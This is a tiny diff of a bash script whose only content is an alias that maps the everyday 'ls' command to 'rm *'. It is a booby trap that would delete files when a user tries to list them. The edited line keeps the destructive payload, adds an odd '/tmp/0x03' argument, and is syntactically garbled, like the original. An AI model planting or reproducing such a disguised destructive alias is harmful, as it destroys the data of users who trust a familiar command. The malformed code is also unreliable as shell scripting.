@@ -1,2 +1,2 @@
 #!/bin/bash
-alias ls 'rm *'
+alias ls /tmp/0x03 'rm *'
